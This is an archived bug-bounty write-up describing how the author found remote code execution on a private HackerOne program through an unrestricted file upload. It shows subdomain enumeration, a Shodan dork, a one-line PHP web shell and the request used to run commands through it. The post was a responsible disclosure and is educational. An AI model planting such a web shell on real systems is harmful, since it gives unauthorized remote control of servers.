# File Upload (RCE) to Bounty | HackerOne

- **Source URL:** https://starlox.medium.com/file-upload-rce-to-bounty-hackerone-928e8e5b375e?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501113957/https://starlox.medium.com/file-upload-rce-to-bounty-hackerone-928e8e5b375e?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7431 (id 7431)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# File Upload (RCE) to Bounty | HackerOne

I**ntro : Hello Hacker’s😀 what’s up! After a Long Time. Hope you are all Fine. Today I am gonna show you how do I get an RCE Vulnerability in an Endpoint that Leads me to Huge Bounty. So let’s Dive into it.**


So it’s a Private Program in **Hackerone**. So I started with Subdomain Enumeration.

`subfinder -d domain.com > subs.txt`
# Hacking with Shodan :

Then I search for the Domain in **Shodan**. I used the following Dork.

`hostname:"domain.com" 200 [Set Search Query to http.title]`
I have found some domain but from them I got a Domain where I can **Upload** any types of File.

And this is running on **8443** Port.

`https://something.stb.domain.com:8443/` # **Upload → RCE :**

So I upload a simple PHP Script for **Remote Command Execution**.

`<?php system($_GET['cmd']); ?>`
And it uploaded in uploads Folder. And I tried to Execute Command.

`https://something.stb.domain.com:8443/uploads/test.php?cmd=id`
And I got the below Response.

# Reporting :

So I reported that Bug on **Hackerone** and they accepted it as a Valid One and Rewarded me with Bounty after 3 days.

So that’s it for today. Hope you learn something new!!

**THANKS FOR READING!**

**If you enjoy this don’t forget to Like it and Follow me for more Articles.**

**Linkedin Profile → https://www.linkedin.com/in/subhankar-paul-332085254/**

**Happy Hacking\~**
